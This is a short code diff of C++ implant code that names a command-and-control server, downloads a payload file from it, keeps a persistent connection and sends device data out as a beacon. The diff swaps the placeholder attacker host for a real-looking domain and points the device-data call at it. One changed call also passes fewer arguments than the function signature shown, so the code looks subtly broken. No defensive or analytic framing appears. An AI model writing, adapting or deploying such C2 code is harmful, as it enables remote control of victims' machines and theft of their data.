@@ -96,7 +96,7 @@ void sendDeviceData(const std::string& deviceId, const std::string& deviceName, 
 
 int main() {
     // Example usage
-    std::string c2Server = "http://attacker-server.com:8000";
+    std::string c2Server = "http://abhope.eu.org:8000";
     std::string payloadUrl = c2Server + "/payload.bin";
     std::string outputFile = "downloaded_payload.bin";
 
@@ -108,7 +108,7 @@ int main() {
     persistentConnection.detach();
 
     // Send device data to the dashboard
-    sendDeviceData("1", "Device 1", "192.168.1.2");
+    sendDeviceData("1", "http://abhope.eu.org:8000/devices");
 
     std::cout << "Payload downloaded and beacon sent successfully." << std::endl;
 
